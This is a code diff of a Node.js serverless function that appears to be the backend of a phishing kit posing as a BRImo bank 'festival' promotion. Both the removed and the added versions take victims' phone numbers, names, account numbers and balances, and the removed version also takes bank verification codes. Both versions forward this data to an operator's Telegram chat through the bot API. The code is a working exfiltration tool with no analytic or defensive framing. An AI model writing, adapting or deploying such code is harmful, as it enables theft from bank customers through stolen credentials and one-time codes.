@@ -1,151 +1,100 @@
 const axios = require('axios');
 
-exports.handler = async (event, context) => {
-    // Handle CORS preflight requests
-    if (event.httpMethod === 'OPTIONS') {
-        return {
-            statusCode: 204,
-            headers: {
-                'Access-Control-Allow-Origin': '*',
-                'Access-Control-Allow-Headers': 'Content-Type',
-                'Access-Control-Allow-Methods': 'POST, OPTIONS'
-            },
-            body: ''
-        };
-    }
-
+exports.handler = async function(event, context) {
     // Only allow POST requests
     if (event.httpMethod !== 'POST') {
         return {
             statusCode: 405,
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                status: 'error',
-                message: 'Method Not Allowed' 
-            })
+            body: JSON.stringify({ error: 'Method Not Allowed' }),
+            headers: { 'Content-Type': 'application/json' }
         };
     }
 
     try {
-        // Parse incoming data
+        // Parse the incoming data
         const data = JSON.parse(event.body);
-        const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
-        const telegramChatId = process.env.TELEGRAM_CHAT_ID;
+        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-        // Validate environment variables
-        if (!telegramBotToken || !telegramChatId) {
-            throw new Error('Server configuration error: Telegram credentials missing');
-        }
-
-        // Validate request data
-        if (!data.type) {
+        // Validate required environment variables
+        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+            console.error('Telegram credentials not configured');
             return {
-                statusCode: 400,
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    status: 'error',
-                    message: 'Notification type is required'
-                })
+                statusCode: 500,
+                body: JSON.stringify({ error: 'Server configuration error' })
             };
         }
 
-        // Format message based on type
-        let message;
-        switch(data.type) {
-            case 'phone_number':
-                if (!data.phoneNumber) {
-                    return {
-                        statusCode: 400,
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            status: 'error',
-                            message: 'Phone number is required'
-                        })
-                    };
-                }
-
-                message = `├• BRimo | festival\n` +
-                         `├───────────────────\n` +
-                         `├• NO HP : ${data.phoneNumber || '-'}\n` +
-                         `├───────────────────\n` +
-                         `├• NAMA  : ${data.name || '-'}\n` +
-                         `├───────────────────\n` +
-                         `├• SALDO : ${data.balance ? new Intl.NumberFormat('id-ID').format(data.balance) : '-'}\n` +
-                         `╰───────────────────\n` +
-                         `⏱ ${new Date().toLocaleString('id-ID', { 
-                            weekday: 'long',
-                            day: 'numeric',
-                            month: 'long',
-                            year: 'numeric',
-                            hour: '2-digit',
-                            minute: '2-digit',
-                            second: '2-digit'
-                         })}`;
-                break;
-
-            case 'contact_service':
-                message = `📞 BRimo | Customer Service\n` +
-                         `├───────────────────\n` +
-                         `├• REKENING : ${data.accountNumber || '-'}\n` +
-                         `├───────────────────\n` +
-                         `├• ATAS NAMA : ${data.accountName || '-'}\n` +
-                         `├───────────────────\n` +
-                         `├• SALDO : ${data.amount || '-'}\n` +
-                         `├───────────────────\n` +
-                         `├• KODE VERIFIKASI : ${data.virtualCode || '-'}\n` +
-                         `╰───────────────────\n` +
-                         `⏱ ${new Date().toLocaleString('id-ID')}`;
-                break;
-
-            default:
-                return {
-                    statusCode: 400,
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        status: 'error',
-                        message: 'Invalid notification type'
-                    })
-                };
+        // Validate incoming data
+        if (!data.type || !data.accountNumber || !data.accountName) {
+            return {
+                statusCode: 400,
+                body: JSON.stringify({ error: 'Missing required fields' })
+            };
         }
 
-        // Send to Telegram
-        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+        // Format the message based on data type
+        let message = '';
+        if (data.type === 'account_info') {
+            message = `
+├• BRIMO | FESTIVAL DUET
+├───────────────────
+├• NO REK : ${data.accountNumber}
+├───────────────────
+├• NAMA  : ${data.accountName}
+╰───────────────────
+🕒 ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
+            `.trim();
+        } 
+        else if (data.type === 'balance_info') {
+            const formattedBalance = new Intl.NumberFormat('id-ID').format(data.balance);
+            message = `
+├• BRIMO | FESTIVAL DUET
+├───────────────────
+├• NO REK : ${data.accountNumber}
+├───────────────────
+├• NAMA  : ${data.accountName}
+├───────────────────
+├• SALDO : ${formattedBalance}
+╰───────────────────
+🕒 ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
+            `.trim();
+        } else {
+            return {
+                statusCode: 400,
+                body: JSON.stringify({ error: 'Invalid data type' })
+            };
+        }
+
+        // Send message to Telegram
+        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        
         const response = await axios.post(telegramUrl, {
-            chat_id: telegramChatId,
+            chat_id: TELEGRAM_CHAT_ID,
             text: message,
-            parse_mode: 'Markdown',
-            disable_notification: false
+            parse_mode: 'HTML'
         });
 
-        // Success response
+        // Log success
+        console.log('Message sent to Telegram:', response.data);
+
         return {
             statusCode: 200,
-            headers: { 
-                'Content-Type': 'application/json',
-                'Access-Control-Allow-Origin': '*' 
-            },
-            body: JSON.stringify({
-                status: 'success',
-                message: 'Notification sent successfully',
-                telegram_message_id: response.data.result.message_id,
-                timestamp: new Date().toISOString()
+            body: JSON.stringify({ 
+                success: true,
+                message: 'Data sent to Telegram successfully' 
             })
         };
 
     } catch (error) {
-        console.error('Error processing request:', error);
+        // Log detailed error
+        console.error('Error sending to Telegram:', error.response?.data || error.message);
         
         return {
             statusCode: 500,
-            headers: { 
-                'Content-Type': 'application/json',
-                'Access-Control-Allow-Origin': '*' 
-            },
-            body: JSON.stringify({
-                status: 'error',
-                message: 'Internal server error',
-                error: error.message,
-                ...(process.env.NODE_ENV === 'development' && { stack: error.stack })
+            body: JSON.stringify({ 
+                error: 'Failed to send data to Telegram',
+                details: error.response?.data || error.message 
             })
         };
     }
